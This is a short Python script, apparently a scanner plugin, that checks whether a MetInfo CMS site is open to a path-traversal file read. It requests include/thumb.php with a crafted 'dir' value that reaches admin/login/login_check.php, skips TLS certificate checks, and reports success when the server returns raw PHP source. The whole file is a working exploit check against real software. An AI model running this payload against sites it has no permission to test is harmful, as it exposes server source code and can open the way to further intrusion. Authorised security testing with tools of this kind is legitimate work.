import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def doCheck(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"include/thumb.php?dir=http\\..\\admin\\login\\login_check.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if "<?php" in response.text and "login_met_cookie($metinfo_admin_name);" in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"metinfo/include/thumb.php?dir=http\\..\\admin\\login\\login_check.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if "<?php" in response.text and "login_met_cookie($metinfo_admin_name);" in response.text:
		r1=True
	else:
		r1=False
	if r0 or r1:
		return True
	else:
		return False
